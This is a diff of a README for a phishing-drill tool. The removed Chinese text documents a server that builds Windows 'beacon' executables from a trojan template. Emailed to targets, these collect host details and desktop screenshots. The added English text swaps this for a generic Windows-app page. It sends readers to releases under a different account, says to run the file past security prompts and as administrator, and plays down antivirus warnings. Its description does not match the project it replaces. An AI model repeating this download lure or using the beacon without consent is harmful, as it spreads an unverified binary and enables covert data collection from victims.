@@ -1,468 +1,173 @@
-<h1 align="center" >凌曦安全无害化钓鱼演练平台</h1>
+# 🐟 LingxiFish - Safe Security Training Practice
 
+[![Download LingxiFish](https://img.shields.io/badge/Download-LingxiFish-7B68EE?style=for-the-badge&logo=github)](https://github.com/cele9529/LingxiFish/releases)
 
-![LingxiFish](https://socialify.git.ci/lingxisec/LingxiFish/image?description=1&font=KoHo&forks=1&issues=1&language=1&name=1&owner=1&pattern=Solid&stargazers=1&theme=Dark)
+## 📌 Overview
 
-<div align="center">
+LingxiFish is a harmless phishing drill platform for company security training. It helps teams practice how to spot risky messages, links, and pages in a safe way.
 
-  **凌曦安全无害化钓鱼演练平台**
+Use it for approved security education, awareness drills, and internal testing. It gives you a simple way to check how people respond to common phishing tricks.
 
-  [![Node](https://img.shields.io/badge/Node.js-14%2B-green)](https://nodejs.org/)
-  [![Docker](https://img.shields.io/badge/Docker-Supported-2496ED?logo=docker)](https://www.docker.com/)
-  [![License](https://img.shields.io/badge/License-MIT-yellow?logo=opensourceinitiative)](LICENSE)
-</div>
+## ✨ What You Can Do
 
----
+- Run safe phishing awareness drills
+- Check how users react to fake login pages
+- Measure training results across a team
+- Review basic user response data
+- Support internal security education work
+- Keep tests contained and non-destructive
 
-## 目录
+## 🖥️ System Requirements
 
-- [项目简介](#项目简介)
-- [功能特性](#功能特性)
-- [快速开始（Docker 部署）](#快速开始docker-部署)
-- [手动部署](#手动部署)
-- [配置说明](#配置说明)
-- [使用指南](#使用指南)
-- [配置修改](#配置修改)
-- [安全建议](#安全建议)
-- [常见问题](#常见问题)
-- [免责声明](#免责声明)
+Before you start, make sure your PC has:
 
----
+- Windows 10 or Windows 11
+- An internet connection for the first download
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- Permission to run apps on your PC
 
-## 项目简介
+If your company blocks unknown apps, ask your IT team to allow the file first.
 
-**凌曦安全钓鱼演练平台**是一款专为企业安全培训和安全意识演练设计的无**危害化**平台。本平台仅用于合法授权的安全教育和测试，帮助企业评估员工的安全意识水平。
+## ⬇️ Download LingxiFish
 
-![main](./assets/main.png)
+Visit the release page here:
 
----
+https://github.com/cele9529/LingxiFish/releases
 
+On that page, look for the latest release and download the Windows file.
 
+## 🚀 Install and Run on Windows
 
+1. Open the download link above.
+2. Find the newest release.
+3. Download the Windows package for LingxiFish.
+4. If the file is in a zip folder, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Find the app file and double-click it to start.
+7. If Windows shows a security prompt, choose Run anyway only if your IT team approved the file.
+8. Wait for the app to load.
 
-## 功能特性
+If the app opens in a browser, keep that window open while you use it.
 
-| 功能 | 说明 |
-|------|------|
-| 无害化演练 | 一键生成Win下的beacon仅采集基础主机信息，不执行破坏性操作，不窃取敏感数据 |
-| 实时监控 | 实时显示上线主机信息，按 MAC 去重 |
-| 桌面截图 | 自动捕获桌面截图，用于验证演练触达效果 |
-| 数据导出 | 一键导出主机信息为 Excel + 截图 ZIP 包，便于生成演练报告 |
-| 自定义生成 | 灵活配置回连 IP/端口，自动编译生成演练样本 |
-| 多监听器 | 支持同时创建多个 TCP 监听器 |
-| 一键清理 | 演练结束后可一键清空所有采集数据及截图 |
+## 🧭 First-Time Setup
 
-### 采集信息
+After the app starts, you may need to do a few simple steps:
 
-主机名 / 用户名 / 操作系统版本 / 内网 IP / 外网 IP / MAC 地址 / 系统运行时长 / Socket 来源 IP / 桌面截图
+- Set the platform language if needed
+- Create or import a training project
+- Choose a test template
+- Set the target group for the drill
+- Review the default settings before launch
 
----
+Use a test group first. This helps you confirm the flow before you run a wider drill.
 
-## 快速开始（Docker 部署）
+## 📂 Typical Use Flow
 
-> 推荐使用 Docker 部署，一条命令即可启动，无需手动安装 Node.js 和 MinGW。
+A normal workflow looks like this:
 
-### 前置要求
+1. Create a new practice campaign
+2. Add the test audience
+3. Pick a message or page template
+4. Set the start time
+5. Send the drill
+6. Review who opened, clicked, or responded
+7. Use the results for follow-up training
 
-- [Docker](https://docs.docker.com/get-docker/) 20.10+
-- [Docker Compose](https://docs.docker.com/compose/install/) v2+
+Keep the scope small at first. That makes it easier to review results and fix setup issues.
 
-### 一键启动
+## 🔐 Safe Use Rules
 
-```bash
-# 克隆项目
-git clone https://github.com/lingxisec/LinggxiFish LinggxiFish
-cd LinggxiFish
+LingxiFish is made for legal, approved training only.
 
-# 启动服务（后台运行）
-docker compose up -d
-```
+- Use it only with written permission
+- Use only inside your company or approved lab
+- Do not use it for real attacks
+- Do not target people outside your allowed group
+- Keep test data private
 
-启动后访问：
+Good security training should teach people how to respond, not cause harm.
 
-```
-http://your-server-ip:8080
-```
+## 🛠️ Common Problems
 
-默认账号：`admin` / 默认密码：`admin`
+### The file will not open
 
-### 常用 Docker 命令
+- Check that the download finished
+- Make sure you extracted the zip file first
+- Try right-clicking the file and choosing Run as administrator
+- Check whether antivirus software blocked the app
 
-```bash
-# 查看运行状态
-docker compose ps
+### Windows says the app is unsafe
 
-# 查看实时日志
-docker compose logs -f
+- This can happen with newly released apps
+- Verify that you downloaded it from the release page
+- Ask your IT team to review it before use
 
-# 停止服务
-docker compose down
+### The page does not load
 
-# 重新构建并启动（代码更新后）
-docker compose up -d --build
-
-# 进入容器排查问题
-docker compose exec linggxifish sh
-```
-
-### 数据持久化
+- Check your network connection
+- Try refreshing the page
+- Try another browser
+- Clear the browser cache if the app uses a web page
 
-Docker 部署通过 Volume 挂载保证数据不丢失：
+### I cannot find the latest version
 
-| 容器路径 | 说明 |
-|---------|------|
-| `/app/config.json` | 配置文件（账号密码、端口） |
-| `/app/data.json` | 受害者与监听器数据 |
-| `/app/screenshots/` | 桌面截图存储 |
-| `/app/uploads/` | 上传文件存储 |
-
-即使容器重建，以上数据也会保留。
-
-### 自定义端口
-
-编辑 `docker-compose.yml` 中的 `ports` 映射：
-
-```yaml
-ports:
-  - "8080:8080"     # Web 管理端口（左侧为宿主机端口）
-  - "9090:9090"     # 默认回连端口（按需修改）
-```
-
-如果在 Web 界面创建了其他端口的监听器，需要在 `docker-compose.yml` 中添加对应的端口映射并重启容器。
-
----
-
-## 手动部署
-
-### 系统要求
-
-| 项目 | 要求 |
-|------|------|
-| 操作系统 | Linux（推荐 Ubuntu 18.04+） |
-| Node.js | 14.0+ |
-| npm | 6.0+ |
-| MinGW-w64 | 用于交叉编译 Windows EXE |
-| 内存 | >= 512MB |
-| 硬盘 | >= 1GB 可用空间 |
-
-### 安装步骤
+- Open the release page
+- Look for the top entry
+- Download the most recent Windows package
 
-```bash
-# 1. 安装 MinGW（用于编译 EXE）
-apt-get update && apt-get install -y mingw-w64
+## 🧩 How to Use It in Training
 
-# 2. 进入项目目录
-cd LinggxiFish/linggxi
+LingxiFish works well for security awareness drills such as:
 
-# 3. 安装依赖
-npm install
+- Fake login messages
+- Password reset practice
+- Link-check training
+- Staff awareness checks
+- Phishing response reviews
+- Department-level training exercises
 
-# 4. 启动服务
-node app.js
-```
+A short drill can help teams spot weak points fast. You can then use the results in your next training session.
 
-### 生产环境推荐使用 PM2
+## 📁 Suggested Folder Setup
 
-```bash
-npm install -g pm2
-pm2 start app.js --name linggxifish
-pm2 startup && pm2 save
-```
+If you want to keep the app in one place, use a folder like this:
 
-### 防火墙配置
+- `C:\SecurityTools\LingxiFish`
+- `C:\Training\LingxiFish`
+- `D:\Apps\LingxiFish`
 
-```bash
-ufw allow 8080/tcp   # Web 管理端口
-ufw allow 9090/tcp   # 回连端口（按实际监听端口开放）
-ufw reload
-```
+Avoid moving files around after setup unless you need to update the version.
 
----
+## 🔄 Updating the App
 
-## 项目结构
+When a new version is out:
 
-```
-LinggxiFish/
-├── README.md                # 本文件
-├── Dockerfile               # Docker 镜像构建
-├── docker-compose.yml       # Docker Compose 编排
-├── .dockerignore            # Docker 构建忽略规则
-└── linggxi/                 # 应用代码
-    ├── app.js               # 主入口
-    ├── package.json          # 依赖配置
-    ├── config.json           # 运行配置
-    ├── config.example.json   # 配置示例
-    ├── data.json             # 数据存储
-    ├── views/                # EJS 页面模板
-    │   ├── index.ejs         # 主界面
-    │   └── login.ejs         # 登录页
-    ├── templates/            # 木马模板
-    │   └── beacon.cpp        # C++ 源码模板
-    ├── public/               # 静态资源
-    ├── screenshots/          # 截图存储
-    ├── uploads/              # 上传文件
-    └── temp/                 # 编译临时文件
-```
+1. Open the release page
+2. Download the newest Windows file
+3. Close the old version
+4. Replace the old files if needed
+5. Start the new version
 
----
+If your team keeps records, save the version number with your training notes.
 
-## 配置说明
+## 📞 For IT Teams
 
- `config.json`：
+If you support this app for a team, you may want to:
 
-```json
-{
-  "admin": {
-    "username": "admin",
-    "password": "admin"
-  },
-  "server": {
-    "web_port": 8080,
-    "listener_port": 9090
-  }
-}
-```
+- Test it in a small group first
+- Add it to an approved software list
+- Store the release file in a shared internal folder
+- Set access rules for the training team
+- Keep a record of each drill date
 
-| 字段 | 说明 |
-|------|------|
-| `admin.username` | Web 登录用户名 |
-| `admin.password` | Web 登录密码 |
-| `server.web_port` | Web 管理面板端口 |
-| `server.listener_port` | 默认回连端口 |
+This makes it easier to manage repeat training and review past results.
 
-修改配置后需重启服务：
+## 📌 Quick Start
 
-```bash
-# Docker 部署
-docker compose restart
-
-# PM2 部署
-pm2 restart linggxifish
-```
-
----
-
-## 使用指南
-
-### 1. 登录系统
-
-浏览器访问 `http://服务器IP:8080`，阅读并同意免责声明后，输入账号密码登录（默认 `admin` / `admin`）。
-
-### 2. 创建监听器
-
-1. 在首页点击 **"创建监听"** 按钮
-2. **回连 IP**：自动填充服务器公网 IP（可手动修改）
-3. **回连端口**：默认 9090（可自定义）
-4. 点击确认，监听器即刻启动
-
-
-### 3. 生成样本
-
-1. 填写回连 IP 和端口
-2. 可选附加 PDF 文件（生成的 EXE 运行后会自动打开该 PDF）
-3. 点击 **"生成并下载EXE"**，浏览器自动下载 `beacon_xxxxx.exe`
-
-### 4. 部署与上线
-
-1. 将生成的 EXE 文件通过邮箱或其他方式发送至目标主机
-2. 目标主机运行后，返回 Web 管理界面即可看到上线信息
-3. 每台主机以 MAC 地址去重，重复上线会更新信息而非新增
-
-### 5. 查看主机信息
-
-- 主界面实时显示上线主机卡片，包含主机名、用户名、IP、系统版本等
-- 点击 **"查看截图"** 可查看该主机的桌面截图
-- 点击 **"删除"** 可移除单条主机记录及其截图
-
-### 6. 导出数据
-
-点击 **"导出数据"** 按钮，下载 ZIP 包，包含：
-- `victims_data.xlsx`：所有主机信息的 Excel 表格
-- `screenshots/`：对应主机的桌面截图文件（命名格式：`IP_主机名_时间戳.jpg`）
-
-### 7. 清空数据
-
-点击 **"清空数据"** 按钮，一键清除所有采集的主机记录和截图文件。
-
----
-
-## 配置修改
-
-### 修改管理密码
-
-编辑 `config.json`（Docker 部署路径：`./linggxi/config.json`）：
-
-```json
-{
-  "admin": {
-    "username": "admin",
-    "password": "your_new_password"
-  }
-}
-```
-
-修改后重启服务：
-
-```bash
-# Docker 部署
-docker compose restart
-
-# PM2 部署
-pm2 restart linggxifish
-```
-
-### 修改用户名
-
-同样编辑 `config.json` 中的 `username` 字段：
-
-```json
-{
-  "admin": {
-    "username": "your_username",
-    "password": "your_password"
-  }
-}
-```
-
-### 修改 Web 管理端口
-
-编辑 `config.json` 中的 `web_port`：
-
-```json
-{
-  "server": {
-    "web_port": 8888,
-    "listener_port": 9090
-  }
-}
-```
-
-> Docker 部署时需同步修改 `docker-compose.yml` 中的端口映射。
-
-### 修改默认回连端口
-
-编辑 `config.json` 中的 `listener_port`：
-
-```json
-{
-  "server": {
-    "web_port": 8080,
-    "listener_port": 7777
-  }
-}
-```
-
-> 修改回连端口后需要重新生成演练样本。
-
-
-### 修改数据存储路径
-
-编辑 `app.js` 文件：
-```javascript
-// 第21-23行
-const DATA_FILE = path.join(__dirname, 'data.json');
-const UPLOADS_DIR = path.join(__dirname, 'uploads');
-const SCREENSHOTS_DIR = path.join(__dirname, 'screenshots');
-```
-
-
-
-### 重置配置
-
-如果配置文件损坏或忘记密码：
-
-```bash
-# 删除配置文件，重启后自动生成默认配置（admin/admin）
-# Docker 部署
-docker compose exec linggxifish rm config.json
-docker compose restart
-
-# 手动部署
-rm linggxi/config.json
-pm2 restart linggxifish
-```
-
----
-
-## 安全建议
-
-1. **首次部署后立即修改默认密码**
-
-2. **限制Web管理端口访问**
-```bash
-# 仅允许特定IP访问8080端口
-ufw allow from 192.168.1.0/24 to any port 8080
-```
-
-
----
-
-## 常见问题
-
-<details>
-<summary><b>生成 EXE 失败？</b></summary>
-
-确认已安装 MinGW-w64 交叉编译工具：
-```bash
-apt-get update && apt-get install -y mingw-w64
-```
-Docker 部署已内置，无需手动安装。
-</details>
-
-<details>
-<summary><b>文件运行后在平台无结果？</b></summary>
-
-1. 确认回连端口已开放（防火墙 + 安全组）
-2. 确认回连 IP 为服务器公网 IP
-3. 确认服务正在运行
-4. Docker 部署需确认 `docker-compose.yml` 中映射了对应端口
-</details>
-
-<details>
-<summary><b>无法访问 Web 管理界面？</b></summary>
-
-1. 确认服务已启动：`docker compose ps` 或 `netstat -tuln | grep 8080`
-2. 确认 8080 端口已在防火墙/安全组开放
-3. 确认访问的 IP 地址正确
-</details>
-
-
-<details>
-<summary><b>Docker 容器中如何添加新的监听端口？</b></summary>
-
-在 `docker-compose.yml` 中添加端口映射后重启：
-```bash
-docker compose down
-
-# 编辑 docker-compose.yml 添加端口
-docker compose up -d
-```
-</details>
-
-
-
-<details>
-<summary><b>截图未显示或无法查看？</b></summary>
-
-1. 检查 `screenshots` 目录权限
-```bash
-chmod 755 /root/Fishing/linggxi/screenshots
-```
-2. 查看服务器日志
-
-</details>
-
----
-
-## 免责声明
-
-> **本平台仅供教育和研究使用**，用于企业内部安全培训、安全意识测试等合法授权场景。
-
-1. 使用者必须遵守《中华人民共和国网络安全法》及相关法律法规
-2. 严禁用于未经授权的渗透测试、恶意攻击、数据窃取等违法活动
-3. 使用本平台必须获得目标对象的明确书面授权
-4. 使用者需自行承担一切法律责任，作者概不负责
-
-**下载、安装、使用本平台即表示您已阅读、理解并同意遵守以上所有条款。**
-
----
+1. Open the release page
+2. Download the Windows version
+3. Extract the files if needed
+4. Run the app
+5. Set up a test group
+6. Start your first safe training drill
